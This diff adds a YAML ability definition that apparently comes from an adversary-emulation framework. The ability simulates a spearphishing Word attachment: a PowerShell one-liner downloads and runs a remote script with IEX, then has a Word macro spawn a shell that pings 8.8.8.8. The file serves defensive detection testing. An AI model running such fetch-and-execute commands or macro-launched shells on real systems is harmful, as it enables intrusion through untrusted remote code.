@@ -1,0 +1,26 @@
+---
+- id: 0a69420bec84b02bd47464f6835653b1
+  name: Word spawned a command shell and used an IP address in the command line
+  description: 'Word spawning a command prompt then running a command with an IP address
+    in the command line is an indicator of malicious activity.
+
+    Upon execution, CMD will be launched and ping 8.8.8.8.
+
+    '
+  tactic: initial-access
+  technique:
+    attack_id: T1566.001
+    name: 'Phishing: Spearphishing Attachment'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); $macrocode = "   Open `"C:\Users\Public\art.jse`" For
+          Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping
+          8.8.8.8`"`n"; Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"'
+        payloads: []
+        cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
